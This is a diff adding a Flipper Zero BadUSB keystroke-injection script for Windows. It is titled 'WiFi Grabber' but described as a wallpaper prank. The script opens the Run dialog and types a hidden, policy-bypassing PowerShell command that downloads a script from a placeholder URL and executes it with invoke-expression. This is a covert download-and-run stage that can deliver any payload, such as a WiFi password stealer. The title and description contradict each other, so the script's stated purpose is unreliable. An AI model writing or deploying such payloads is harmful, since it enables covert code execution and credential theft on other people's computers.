@@ -1,0 +1,13 @@
+REM Title:          WiFi Grabber
+REM Author:         Rick (LordCodigo) Alvarez & Jose Espitia (Github: https://github.com/JoseEspitia)
+REM Description:    
+REM                 EN: Script for changin the desktop wallpaper (Prank)
+REM                 ES: Script para cambiar el fondo de escritorio (Broma)
+REM Target:         Device: Flipper Zero / Target platform: Windows
+REM Thanks to:      Jose Espitia for his post in https://www.joseespitia.com/2017/09/15/set-wallpaper-powershell-function/
+
+GUI r
+DELAY 200
+STRING powershell -w h -NoP -NonI -Exec Bypass; $pl = iwr """<your_ps_file_url_here>"""; invoke-expression $pl
+DELAY 200
+ENTER
